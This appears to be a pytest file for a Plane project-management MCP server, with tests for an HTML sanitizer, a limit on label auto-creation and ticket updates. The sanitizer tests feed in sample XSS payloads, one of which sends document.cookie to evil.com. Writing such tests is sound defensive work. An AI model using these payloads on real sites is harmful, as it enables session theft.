"""Tests for input validation and data safety sprint.

Covers:
- PLANE-27: HTML sanitization strips XSS vectors while preserving safe formatting
- PLANE-29: Label auto-creation is bounded (max 3 new labels per request)
- PLANE-38: update_ticket retrieves without expand to avoid label ValidationError
"""

from unittest.mock import MagicMock, patch

import pytest

from plane_mcp.sanitize import sanitize_html


class TestHTMLSanitization:
    """PLANE-27: Sanitize HTML inputs to prevent stored XSS."""

    def test_strips_script_tags(self):
        result = sanitize_html("<p>Hello</p><script>alert('xss')</script>")
        assert "<script>" not in result
        assert "alert" not in result
        assert "<p>Hello</p>" in result

    def test_strips_event_handlers(self):
        result = sanitize_html('<img src="x" onerror="alert(1)">')
        assert "onerror" not in result
        assert "alert" not in result

    def test_strips_javascript_urls(self):
        result = sanitize_html('<a href="javascript:alert(1)">click</a>')
        assert "javascript:" not in result

    def test_preserves_safe_html(self):
        safe = "<p>Hello <strong>world</strong> and <em>italic</em></p>"
        result = sanitize_html(safe)
        assert "<strong>world</strong>" in result
        assert "<em>italic</em>" in result

    def test_preserves_links_with_href(self):
        result = sanitize_html('<a href="https://example.com">link</a>')
        assert 'href="https://example.com"' in result

    def test_preserves_lists(self):
        result = sanitize_html("<ul><li>item1</li><li>item2</li></ul>")
        assert "<ul>" in result
        assert "<li>item1</li>" in result

    def test_preserves_code_blocks(self):
        result = sanitize_html("<pre><code>def foo(): pass</code></pre>")
        assert "<pre>" in result
        assert "<code>" in result

    def test_preserves_tables(self):
        html = "<table><thead><tr><th>Name</th></tr></thead><tbody><tr><td>Val</td></tr></tbody></table>"
        result = sanitize_html(html)
        assert "<table>" in result
        assert "<th>Name</th>" in result

    def test_none_passthrough(self):
        assert sanitize_html(None) is None

    def test_empty_string_passthrough(self):
        assert sanitize_html("") == ""

    def test_strips_data_uri_images(self):
        result = sanitize_html('<img src="data:text/html,<script>alert(1)</script>">')
        assert "data:" not in result

    def test_strips_style_attribute(self):
        result = sanitize_html('<div style="background:url(javascript:alert(1))">content</div>')
        assert "style=" not in result
        assert "content" in result

    def test_complex_xss_payload(self):
        payload = """<p>Normal text</p>
        <img src=x onerror="fetch('https://evil.com/steal?cookie='+document.cookie)">
        <svg onload="alert(1)">
        <iframe src="https://evil.com"></iframe>
        <p>More normal text</p>"""
        result = sanitize_html(payload)
        assert "onerror" not in result
        assert "onload" not in result
        assert "<iframe" not in result
        assert "<svg" not in result
        assert "Normal text" in result
        assert "More normal text" in result


class TestLabelCreationBounds:
    """PLANE-29: Unbounded label auto-creation must be capped."""

    def test_rejects_more_than_three_new_labels(self):
        from plane_mcp.journey.tools.create_update import CreateUpdateJourney

        mock_resolver = MagicMock()
        journey = CreateUpdateJourney(mock_resolver)

        mock_label_list = MagicMock()
        mock_label_list.results = []

        with patch("plane_mcp.journey.tools.create_update.get_plane_client_context") as mock_ctx:
            mock_client = MagicMock()
            mock_client.labels.list.return_value = mock_label_list
            mock_ctx.return_value = (mock_client, "test-ws")

            with pytest.raises(ValueError, match="Too many new labels"):
                journey._resolve_or_create_labels(
                    "proj-id",
                    ["label1", "label2", "label3", "label4"]
                )

    def test_allows_three_new_labels(self):
        from plane_mcp.journey.tools.create_update import CreateUpdateJourney

        mock_resolver = MagicMock()
        journey = CreateUpdateJourney(mock_resolver)

        mock_label_list = MagicMock()
        mock_label_list.results = []

        with patch("plane_mcp.journey.tools.create_update.get_plane_client_context") as mock_ctx:
            mock_client = MagicMock()
            mock_client.labels.list.return_value = mock_label_list
            mock_new_label = MagicMock()
            mock_new_label.id = "new-id"
            mock_client.labels.create.return_value = mock_new_label
            mock_ctx.return_value = (mock_client, "test-ws")

            result = journey._resolve_or_create_labels(
                "proj-id",
                ["new1", "new2", "new3"]
            )
            assert len(result) == 3

    def test_existing_labels_dont_count(self):
        from plane_mcp.journey.tools.create_update import CreateUpdateJourney

        mock_resolver = MagicMock()
        journey = CreateUpdateJourney(mock_resolver)

        existing1 = MagicMock()
        existing1.name = "existing1"
        existing1.id = "id-1"
        existing2 = MagicMock()
        existing2.name = "existing2"
        existing2.id = "id-2"

        mock_label_list = MagicMock()
        mock_label_list.results = [existing1, existing2]

        with patch("plane_mcp.journey.tools.create_update.get_plane_client_context") as mock_ctx:
            mock_client = MagicMock()
            mock_client.labels.list.return_value = mock_label_list
            mock_new_label = MagicMock()
            mock_new_label.id = "new-id"
            mock_client.labels.create.return_value = mock_new_label
            mock_ctx.return_value = (mock_client, "test-ws")

            # 2 existing + 3 new = 5 total, but only 3 are new — should pass
            result = journey._resolve_or_create_labels(
                "proj-id",
                ["existing1", "existing2", "new1", "new2", "new3"]
            )
            assert len(result) == 5
            assert mock_client.labels.create.call_count == 3

    def test_rejects_five_new_labels(self):
        from plane_mcp.journey.tools.create_update import CreateUpdateJourney

        mock_resolver = MagicMock()
        journey = CreateUpdateJourney(mock_resolver)

        mock_label_list = MagicMock()
        mock_label_list.results = []

        with patch("plane_mcp.journey.tools.create_update.get_plane_client_context") as mock_ctx:
            mock_client = MagicMock()
            mock_client.labels.list.return_value = mock_label_list
            mock_ctx.return_value = (mock_client, "test-ws")

            with pytest.raises(ValueError, match="Too many new labels"):
                journey._resolve_or_create_labels(
                    "proj-id",
                    ["a", "b", "c", "d", "e"]
                )
            # Verify no create calls were made before the rejection
            mock_client.labels.create.assert_not_called()


class TestUpdateTicketNoExpand:
    """PLANE-38: update_ticket must not use expand to avoid label ValidationError."""

    def test_get_called_for_pydantic_bypass(self):
        """Verify that update_ticket retrieves using _get internal method."""
        from plane_mcp.journey.tools.create_update import CreateUpdateJourney

        mock_resolver = MagicMock()
        mock_resolver.resolve_ticket.return_value = "work-item-uuid"
        mock_resolver.resolve_project.return_value = "project-uuid"

        journey = CreateUpdateJourney(mock_resolver)

        mock_work_item = {"id": "ticket-1", "name": "Original Title", "description_html": "<p>Original desc</p>"}

        with patch("plane_mcp.journey.tools.create_update.get_plane_client_context") as mock_ctx:
            mock_client = MagicMock()
            mock_client.work_items._get.return_value = mock_work_item
            mock_ctx.return_value = (mock_client, "test-ws")

            journey.update_ticket("TEST-1", new_title="New Title")

            # Verify _get was called
            mock_client.work_items._get.assert_called_once()

    def test_update_ticket_sanitizes_description(self):
        """Verify descriptions are sanitized before sending to API."""
        from plane_mcp.journey.tools.create_update import CreateUpdateJourney

        mock_resolver = MagicMock()
        mock_resolver.resolve_ticket.return_value = "work-item-uuid"
        mock_resolver.resolve_project.return_value = "project-uuid"

        journey = CreateUpdateJourney(mock_resolver)

        mock_work_item = {
            "id": "ticket-1",
            "name": "Title",
            "description_html": ""
        }

        with patch("plane_mcp.journey.tools.create_update.get_plane_client_context") as mock_ctx:
            mock_client = MagicMock()
            mock_client.work_items._get.return_value = mock_work_item
            mock_ctx.return_value = (mock_client, "test-ws")

            journey.update_ticket("TEST-1", append_text='<script>alert("xss")</script>safe text')

            update_call = mock_client.work_items.update.call_args
            data = update_call.kwargs["data"]
            assert "<script>" not in data.description_html
            assert "safe text" in data.description_html
